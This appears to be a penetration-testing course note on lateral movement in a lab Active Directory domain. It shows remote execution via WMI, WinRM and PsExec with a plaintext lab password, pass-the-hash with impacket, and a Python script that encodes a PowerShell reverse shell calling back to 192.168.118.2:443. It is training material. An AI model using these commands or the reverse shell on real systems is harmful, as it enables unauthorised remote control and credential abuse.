---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Module 23: Lateral Movement in Active Directory

## Active Directory Lateral Movement Techniques

### WMI and WinRM

WMI communicates through _Remote Procedure Calls (RPC)_ over port 135 for remote access and a port between 19152 and 65535 for session data.

Using **wmic** to launch a remote process:

{% code overflow="wrap" %}
```batch
C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 752;
        ReturnValue = 0;
};
```
{% endcode %}

Using **PowerShell** requires a few more steps:

{% code overflow="wrap" %}
```powershell
// Creating teh PSCredential object
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

// Creating a Common Information Model (CIM) via the New-CimSession cmdlet.
PS C:\Users\jeff> $options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options 
PS C:\Users\jeff> $command = 'calc';

// Invoking the CIM Method.
PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     3712           0 192.168.50.73
```
{% endcode %}

Using **python** to encode a PowerShell reverse shell, so we don't need to escape any special characters when inserting it as a WMI payload:

{% code overflow="wrap" %}
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
{% endcode %}

WinRM communicates over TCP port 5986 for encrypted HTTPS traffic and 5985 for plain HTTP.

Utilizing WinRM via **winrs** to execute remote commands:

```batch
C:\Users\jeff> winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
FILES04
corp\jen
```

Utilizing WinRM via **New-PSSession** to execute remote commands:

{% code overflow="wrap" %}
```powershell
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\Users\jeff> Enter-PSSession 1
[192.168.50.73]: PS C:\Users\jen\Documents> whoami
corp\jen

[192.168.50.73]: PS C:\Users\jen\Documents> hostname
FILES04
```
{% endcode %}

### PsExec

PSExec needs three things to be used for lateral movement:

1. The user that authenticates to the target machine needs to be part of the Administrators local group
2. The _ADMIN$_ share must be available
3. File and Printer Sharing must be turned on

By default, those last two requirements are met on modern Windows Server systems.

Using psexec to start an interactive cmd prompt on a remote device:

```batch
PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname
FILES04

C:\Windows\system32> whoami
corp\jen
```

### Pass the Hash

_Pass the Hash (PtH)_ allows us to authenticate to a remote system or service using a user's NTLM hash instead of their plaintext password. This will _only_ work for servers or services using NTLM authentication. Not fo rservers/services using Kerberos authentication.

PtH also has three requirements:

1. SMB through the firewall must be open (commonly port 445)
2. Windows File and Printer Sharing must be enabled
3. The _ADMIN$_ must also be available.

Using **wmiexec** to pass the hash:

{% code overflow="wrap" %}
```bash
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
FILES04

C:\>whoami
files04\administrator
```
{% endcode %}

### Overpass the Hash

### Pass the Ticket

### DCOM

## Active Directory Persistence

### Golden Ticket

### Shadow Copies
